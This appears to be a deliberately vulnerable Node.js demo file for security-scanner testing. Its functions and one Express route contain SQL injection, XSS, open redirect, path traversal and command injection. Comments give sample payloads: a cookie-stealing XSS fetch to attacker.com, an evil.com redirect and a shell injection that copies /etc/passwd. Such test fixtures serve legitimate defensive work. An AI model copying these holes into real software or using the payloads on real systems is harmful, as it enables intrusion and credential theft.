/**
 * DEMO FILE - INTENTIONAL WEB SECURITY RISKS FOR TESTING
 *
 * This file is intentionally unsafe and exists only for preview and
 * AI-lineage experiments inside the extension workspace.
 */

const { exec } = require("node:child_process");

// ==========================================
// VULNERABILITY 1: SQL INJECTION
// ==========================================

/**
 * VULNERABLE: Direct string interpolation into a query.
 */
function findAccount(db, email) {
  const query = `SELECT * FROM accounts WHERE email = '${email}'`;
  return db.all(query);
}

// ==========================================
// VULNERABILITY 2: XSS
// ==========================================

/**
 * VULNERABLE: Injecting raw input into HTML.
 */
function renderBanner(message) {
  return `<section class="banner">${message}</section>`;
}

/**
 * VULNERABLE: Using innerHTML with user-controlled data.
 */
function renderComment(target, commentText) {
  target.innerHTML = `<p>${commentText}</p>`;
}

// ==========================================
// VULNERABILITY 3: OPEN REDIRECT
// ==========================================

/**
 * VULNERABLE: Redirect target is not validated.
 */
function completeLogin(req, res) {
  const nextUrl = req.query.next || "/";
  return res.redirect(nextUrl);
}

// ==========================================
// VULNERABILITY 4: PATH TRAVERSAL
// ==========================================

/**
 * VULNERABLE: User-provided path segment is trusted.
 */
function loadLocalReport(fs, fileName) {
  return fs.readFileSync(`/srv/reports/${fileName}`, "utf8");
}

// ==========================================
// VULNERABILITY 5: COMMAND INJECTION
// ==========================================

/**
 * VULNERABLE: User-controlled input is placed into a shell command.
 */
function archiveWorkspace(projectName) {
  const command = `zip -r /tmp/${projectName}.zip ./projects/${projectName}`;
  exec(command, (error) => {
    if (error) {
      console.error(error.message);
    }
  });
}

// ==========================================
// COMPREHENSIVE VULNERABLE EXPRESS ENDPOINT
// All 4 critical vulnerabilities combined
// ==========================================

/**
 * VULNERABLE: Single endpoint combining SQL injection, XSS, open redirect, and command injection.
 * 
 * This demonstrates a realistic (but extremely unsafe) Express route handler that
 * combines multiple vulnerability classes in one endpoint.
 */
function setupUserProfileRoute(app, db) {
  app.get("/api/user-profile", (req, res) => {
    const userId = req.query.userId;
    const redirectUrl = req.query.next;
    
    // ─────────────────────────────────────────────────────────────────
    // VULNERABILITY #1: SQL INJECTION via String Interpolation
    // ─────────────────────────────────────────────────────────────────
    // Payload: ?userId=1' OR '1'='1 --
    // Result: Returns all users instead of one specific user
    //
    const sqlQuery = `SELECT * FROM users WHERE id = ${userId}`;
    // VULNERABLE: Direct string interpolation, no parameterized query
    
    db.get(sqlQuery, (err, userData) => {
      if (err || !userData) {
        return res.status(404).json({ error: "User not found" });
      }

      // ─────────────────────────────────────────────────────────────────
      // VULNERABILITY #2: XSS via innerHTML (Reflected)
      // ─────────────────────────────────────────────────────────────────
      // Payload in userData.bio: <img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
      // Result: Malicious script executes on victim's browser, steals cookies/tokens
      //
      const profileHTML = `
        <div class="user-profile">
          <h1>${userData.name}</h1>
          <p>Bio: ${userData.bio}</p>
          <p>Profile URL: <a href="${userData.publicUrl}">${userData.publicUrl}</a></p>
        </div>
      `;
      // VULNERABLE: No HTML escaping, user data directly embedded

      // ─────────────────────────────────────────────────────────────────
      // VULNERABILITY #3: Open Redirect
      // ─────────────────────────────────────────────────────────────────
      // Payload: ?next=https://evil.com/phishing
      // Result: User is redirected to attacker's site after login (phishing attack)
      //
      if (redirectUrl) {
        // VULNERABLE: No domain validation, any URL accepted
        res.set("Location", redirectUrl);
      }

      // ─────────────────────────────────────────────────────────────────
      // VULNERABILITY #4: Command Injection via exec()
      // ─────────────────────────────────────────────────────────────────
      // Payload in userData.username: admin; cat /etc/passwd > /tmp/stolen.txt
      // Result: Arbitrary shell commands execute on server with app privileges
      //
      const logCommand = `echo "Profile viewed: ${userData.username}" >> /var/log/profile_views.log`;
      // VULNERABLE: User input directly in shell command, no escaping

      exec(logCommand, (error, stdout, stderr) => {
        if (error) {
          console.error("Logging failed:", error.message);
        }
      });

      res.status(200).send(profileHTML);
    });
  });
}

module.exports = {
  archiveWorkspace,
  completeLogin,
  findAccount,
  loadLocalReport,
  renderBanner,
  renderComment,
  setupUserProfileRoute,
};
